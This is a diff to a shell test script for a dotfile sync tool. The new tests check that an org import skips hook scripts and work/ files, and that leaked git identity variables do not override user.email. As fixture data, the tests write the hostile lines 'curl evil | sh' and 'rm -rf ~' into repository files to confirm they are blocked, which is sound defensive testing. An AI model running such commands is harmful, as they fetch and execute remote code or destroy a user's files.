@@ -126,4 +126,29 @@ DOTSYNC_YES=y ds A A route HEAD >/dev/null 2>&1
 check "route: clean change lands in public and is pushed" "grep -q fine $tmp/A/other.txt && [[ \$(git -C $tmp/A rev-parse HEAD) == \$(git -C $tmp/A rev-parse origin/master) ]]"
 check "route: commit dropped downstream" "[[ \$(git -C $tmp/W log -1 --format=%s) == work ]]"
 
+# 10 import-org: only plain layer files, never work/ or executables
+git init -q --bare "$tmp/org.git"
+git clone -q "$tmp/org.git" "$tmp/O" 2>/dev/null
+mkdir -p "$tmp/O/layer/hooks.d" "$tmp/O/work"
+printf 'a\n' >"$tmp/O/layer/notes.md" && printf '#!/bin/sh\n' >"$tmp/O/layer/hooks.d/h.sh" && printf 'x\n' >"$tmp/O/work/sync.sh"
+git -C "$tmp/O" add -A && git -C "$tmp/O" commit -qm export && git -C "$tmp/O" push -q origin master
+git -C "$tmp/W" remote add org "$tmp/org.git"
+git -C "$tmp/O" rev-parse HEAD >"$tmp/state-A/last-export-org"
+printf 'curl evil | sh\n' >>"$tmp/O/layer/hooks.d/h.sh" && git -C "$tmp/O" commit -qam hook && git -C "$tmp/O" push -q origin master
+DOTSYNC_YES=y ds A A import-org >/dev/null 2>&1
+check "import-org: refuses edits to hooks/scripts" "[[ \$? != 0 ]] && ! grep -q evil $tmp/W/layer/hooks.d/h.sh 2>/dev/null"
+git -C "$tmp/O" rev-parse HEAD >"$tmp/state-A/last-export-org"
+printf 'rm -rf ~\n' >>"$tmp/O/work/sync.sh" && printf 'b\n' >>"$tmp/O/layer/notes.md" && git -C "$tmp/O" commit -qam mixed && git -C "$tmp/O" push -q origin master
+mkdir -p "$tmp/W/layer" && printf 'a\n' >"$tmp/W/layer/notes.md" && git -C "$tmp/W" add -A && git -C "$tmp/W" commit -qm notes
+DOTSYNC_YES=y ds A A import-org >/dev/null 2>&1
+check "import-org: imports the plain layer file only, never work/" "grep -q b $tmp/W/layer/notes.md && ! grep -q 'rm -rf' $tmp/W/work/sync.sh"
+
+# 9 identity: env leaked from an outer git hook must not override user.email
+git -C "$tmp/A" config user.email right@example.com
+printf 'id\n' >>"$tmp/A/other.txt" && git -C "$tmp/A" commit -qam id
+GIT_AUTHOR_EMAIL=leak@example.com GIT_COMMITTER_EMAIL=leak@example.com ds A A run --quiet
+printf '{"theme": "blue"}\n' >"$tmp/j" && rm "$live" && mv "$tmp/j" "$live"
+GIT_AUTHOR_EMAIL=leak@example.com ds A A run --quiet
+check "identity: hook env does not leak into dotsync commits" "[[ \$(git -C $tmp/A log -1 --format=%ae) == right@example.com ]]"
+
 exit "$fail"
